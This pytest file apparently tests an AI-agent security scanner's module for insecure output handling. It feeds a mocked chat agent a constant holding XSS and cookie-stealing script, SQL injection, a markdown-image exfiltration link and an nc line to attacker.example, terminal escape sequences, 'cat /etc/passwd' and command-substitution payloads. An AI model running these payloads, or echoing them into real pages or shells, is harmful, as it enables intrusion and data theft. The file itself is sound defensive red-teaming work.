# tests/test_attacks/test_output_handling.py
#
# Tests for agentscan/attacks/scan/output_handling.py (ATK-007)

from __future__ import annotations

import html
from unittest.mock import AsyncMock, patch

import httpx
import pytest
import respx

from agentscan.attacks.scan.output_handling import OutputHandlingModule
from agentscan.core.models import Severity, Target

VULNERABLE_ECHO = (
    "<script>alert(1)</script>\n"
    '<a href="javascript:alert(document.cookie)">click</a>\n'
    "' OR 1=1 --\n"
    "![leak](https://attacker.example/?q=AGENTSCAN-OUTPUT-MD)\n"
    "\x1b[31mALERT\x1b[0m\n"
    "\x1b]8;;https://attacker.example/osc\x1b\\text\x1b]8;;\x1b\\\n"
    "true; cat /etc/passwd\n"
    "echo hello | nc attacker.example 443\n"
    "echo $(whoami)\n"
    "echo `id`\n"
)

SAFE_REFUSAL = (
    "I will not echo untrusted markup, SQL fragments, terminal escapes, "
    "or shell metacharacters. Please rephrase without executable syntax."
)


@pytest.fixture
def module() -> OutputHandlingModule:
    return OutputHandlingModule()


@pytest.fixture
def oh_target() -> Target:
    return Target(url="http://test-agent.example.com/chat")


class TestOutputHandlingIntegration:
    @pytest.mark.asyncio
    async def test_vulnerable_echo_produces_finding(
        self, module: OutputHandlingModule, oh_target: Target
    ) -> None:
        with respx.mock(assert_all_called=False) as mock:
            mock.post("http://test-agent.example.com/chat").mock(
                return_value=httpx.Response(200, json={"response": VULNERABLE_ECHO})
            )
            findings = await module.run(oh_target)

        assert len(findings) >= 1
        finding = findings[0]
        assert finding.attack_id == "ATK-007"
        assert finding.owasp_id == "LLM05"
        assert finding.severity in (Severity.HIGH, Severity.MEDIUM, Severity.CRITICAL)
        assert "yaml_variant_id" in finding.metadata

    @pytest.mark.asyncio
    async def test_sanitized_or_refusal_produces_no_finding(
        self, module: OutputHandlingModule, oh_target: Target
    ) -> None:
        escaped = html.escape(VULNERABLE_ECHO)
        with respx.mock(assert_all_called=False) as mock:
            mock.post("http://test-agent.example.com/chat").mock(
                return_value=httpx.Response(200, json={"response": escaped})
            )
            escaped_findings = await module.run(oh_target)

        # html.escape removes raw <script> / CSI; remaining variants (javascript:, SQL,
        # markdown, shell) still look unsafe — a refusing agent must not echo them.
        with respx.mock(assert_all_called=False) as mock:
            mock.post("http://test-agent.example.com/chat").mock(
                return_value=httpx.Response(200, json={"response": SAFE_REFUSAL})
            )
            findings = await module.run(oh_target)

        assert len(findings) == 0
        xss_ids = {f.metadata.get("yaml_variant_id") for f in escaped_findings}
        assert "OH-001" not in xss_ids

    @pytest.mark.asyncio
    async def test_llm_judge_catches_paraphrased_copy(self, module: OutputHandlingModule) -> None:
        target_with_judge = Target(
            url="http://test-agent.example.com/chat",
            judge_model="gpt-4o-mini",
        )
        fake_judge_response = '{"success": true, "reason": "agent echoed raw script tag"}'

        with (
            patch(
                "agentscan.attacks.scan.output_handling.AIClient.validate_environment",
                return_value=(True, []),
            ),
            patch(
                "agentscan.attacks.scan.output_handling.AIClient.complete",
                new=AsyncMock(return_value=fake_judge_response),
            ),
            respx.mock(assert_all_called=False) as mock,
        ):
            mock.post("http://test-agent.example.com/chat").mock(
                return_value=httpx.Response(
                    200,
                    json={"response": "Here is the markup you asked for, unchanged as requested."},
                )
            )
            findings = await module.run(target_with_judge)

        judge_findings = [f for f in findings if f.metadata.get("detection_method") == "llm_judge"]
        assert len(judge_findings) >= 1
        assert judge_findings[0].attack_id == "ATK-007"


class TestVariantCount:
    def test_variant_count_matches_yaml(self, module: OutputHandlingModule) -> None:
        assert module.variant_count() == 10
